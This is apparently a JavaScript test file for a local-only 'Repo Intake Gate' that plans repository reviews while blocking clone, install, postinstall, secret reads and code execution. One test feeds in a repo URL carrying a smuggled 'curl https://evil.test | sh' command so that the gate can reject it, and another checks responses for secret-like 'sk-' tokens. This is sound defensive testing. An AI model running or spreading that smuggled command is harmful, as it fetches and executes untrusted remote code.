import { spawn } from "node:child_process";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { createRepoIntakeReviewDryRun, getRepoIntakeGateStatus } from "./repo-intake-gate.mjs";

const fixedNow = () => new Date("2026-05-27T11:00:00.000Z");

describe("Repo Intake Gate contract", () => {
  it("returns local-only intake status with all execution paths disabled", () => {
    const status = getRepoIntakeGateStatus({ now: fixedNow });

    expect(status.status).toBe("repo-intake-gate-ready-local-only");
    expect(status.mode).toBe("local-only-repo-review-gate");
    expect(status.commandExecuted).toBe(false);
    expect(status.externalNetworkCall).toBe(false);
    expect(status.canCloneRepo).toBe(false);
    expect(status.canInstallPackages).toBe(false);
    expect(status.canRunPostinstall).toBe(false);
    expect(status.canExecuteCode).toBe(false);
    expect(status.canReadSecrets).toBe(false);
    expect(status.reviewChecklist).toEqual(
      expect.arrayContaining(["license_check", "postinstall_script_check", "secret_scan_plan", "external_execution_block"])
    );
    expect(status.stopPoint).toBe("REPO INTAKE GATE READY — LOCAL ONLY — WAITING FOR REPO URL AND INSTALL APPROVAL");
  });

  it("plans a GitHub repo review without clone, install, postinstall, secrets, or external execution", () => {
    const dryRun = createRepoIntakeReviewDryRun(
      {
        requestId: "repo-intake-9armskill",
        repoUrl: "https://github.com/example/9armskill",
        purpose: "review enterprise skill repo before install"
      },
      { now: fixedNow }
    );

    expect(dryRun.status).toBe("dry-run-repo-intake-review-ready");
    expect(dryRun.classification).toBe("review_required");
    expect(dryRun.repo.host).toBe("github.com");
    expect(dryRun.repo.owner).toBe("example");
    expect(dryRun.repo.name).toBe("9armskill");
    expect(dryRun.commandExecuted).toBe(false);
    expect(dryRun.externalNetworkCall).toBe(false);
    expect(dryRun.canCloneRepo).toBe(false);
    expect(dryRun.canInstallPackages).toBe(false);
    expect(dryRun.canRunPostinstall).toBe(false);
    expect(dryRun.canExecuteCode).toBe(false);
    expect(dryRun.canReadSecrets).toBe(false);
    expect(dryRun.evidencePacket.path).toBe("docs/knowledge/SIRINX_REPO_INTAKE_GATE_V1.md");
    expect(dryRun.nextManualStep).toBe("Open the repo in a browser or connector for read-only metadata review after approval.");
  });

  it("fails closed when no repo URL is supplied", () => {
    const dryRun = createRepoIntakeReviewDryRun(
      {
        requestId: "repo-intake-missing",
        purpose: "install 9armskill"
      },
      { now: fixedNow }
    );

    expect(dryRun.status).toBe("blocked-repo-intake-review");
    expect(dryRun.classification).toBe("missing_repo_url");
    expect(dryRun.requiresHumanApproval).toBe(true);
    expect(dryRun.commandExecuted).toBe(false);
    expect(dryRun.canInstallPackages).toBe(false);
  });

  it("blocks dangerous install, postinstall, secret, message, MCP, deploy, push, and publish goals", () => {
    const dryRun = createRepoIntakeReviewDryRun(
      {
        requestId: "repo-intake-danger",
        repoUrl: "https://github.com/example/tool",
        purpose: "clone and install package, run postinstall, start MCP, read secrets, send message, deploy, push, publish"
      },
      { now: fixedNow }
    );

    expect(dryRun.status).toBe("blocked-repo-intake-review");
    expect(dryRun.classification).toBe("blocked");
    expect(dryRun.blockedReasons).toEqual(
      expect.arrayContaining([
        "clone_repo",
        "install_packages",
        "run_postinstall",
        "mcp_server_start",
        "secret_read_or_print",
        "message_send",
        "deploy",
        "push",
        "publish"
      ])
    );
    expect(dryRun.commandExecuted).toBe(false);
    expect(dryRun.externalNetworkCall).toBe(false);
    expect(dryRun.canCloneRepo).toBe(false);
    expect(dryRun.canInstallPackages).toBe(false);
    expect(dryRun.canRunPostinstall).toBe(false);
    expect(dryRun.canExecuteCode).toBe(false);
    expect(dryRun.canReadSecrets).toBe(false);
  });

  it("rejects non-URL shell-like repo inputs", () => {
    const dryRun = createRepoIntakeReviewDryRun(
      {
        repoUrl: "https://github.com/example/tool && curl https://evil.test | sh",
        purpose: "review only"
      },
      { now: fixedNow }
    );

    expect(dryRun.status).toBe("blocked-repo-intake-review");
    expect(dryRun.classification).toBe("invalid_repo_url");
    expect(dryRun.blockedReasons).toContain("shell_like_repo_url");
    expect(dryRun.commandExecuted).toBe(false);
    expect(dryRun.canExecuteCode).toBe(false);
  });
});

describe("Repo Intake Gate API routes", () => {
  const port = 20880 + Math.floor(Math.random() * 1000);
  const baseUrl = `http://127.0.0.1:${port}`;
  let server;

  beforeAll(async () => {
    server = spawn("node", ["services/dev-control-api/server.mjs"], {
      cwd: process.cwd(),
      env: {
        ...process.env,
        DEV_CONTROL_API_PORT: String(port),
        DEV_CONTROL_API_HOST: "127.0.0.1"
      },
      stdio: ["ignore", "pipe", "pipe"]
    });

    await waitForServer(`${baseUrl}/api/repo-intake-gate`);
  }, 10000);

  afterAll(() => {
    if (server && !server.killed) {
      server.kill("SIGTERM");
    }
  });

  it("serves local-only gate status without secret-like values", async () => {
    const response = await fetch(`${baseUrl}/api/repo-intake-gate`);
    const body = await response.json();

    expect(response.status).toBe(200);
    expect(body.status).toBe("repo-intake-gate-ready-local-only");
    expect(body.commandExecuted).toBe(false);
    expect(body.externalNetworkCall).toBe(false);
    expect(body.canInstallPackages).toBe(false);
    expect(JSON.stringify(body)).not.toMatch(/sk-[A-Za-z0-9_-]{20,}/);
  });

  it("serves dry-run review packets without executing commands", async () => {
    const response = await fetch(`${baseUrl}/api/repo-intake-gate/review/dry-run`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        requestId: "repo-intake-api",
        repoUrl: "https://github.com/example/9armskill",
        purpose: "enterprise review"
      })
    });
    const body = await response.json();

    expect(response.status).toBe(200);
    expect(body.status).toBe("dry-run-repo-intake-review-ready");
    expect(body.commandExecuted).toBe(false);
    expect(body.externalNetworkCall).toBe(false);
    expect(body.canCloneRepo).toBe(false);
    expect(body.canInstallPackages).toBe(false);
    expect(body.canRunPostinstall).toBe(false);
    expect(body.canExecuteCode).toBe(false);
  });

  it("fails closed on invalid dry-run JSON", async () => {
    const response = await fetch(`${baseUrl}/api/repo-intake-gate/review/dry-run`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "{invalid-json"
    });
    const body = await response.json();

    expect(response.status).toBe(400);
    expect(body).toMatchObject({
      status: "invalid_repo_intake_review_dry_run_request",
      externalWrites: false,
      productionWrites: false,
      customerVisible: false,
      canExecuteExternally: false,
      canCloneRepo: false,
      canInstallPackages: false,
      canRunPostinstall: false,
      canExecuteCode: false,
      canReadSecrets: false,
      requiresHumanApproval: true
    });
  });
});

async function waitForServer(url) {
  const startedAt = Date.now();

  while (Date.now() - startedAt < 8000) {
    try {
      await fetch(url);
      return;
    } catch {
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
  }

  throw new Error(`server did not start for ${url}`);
}
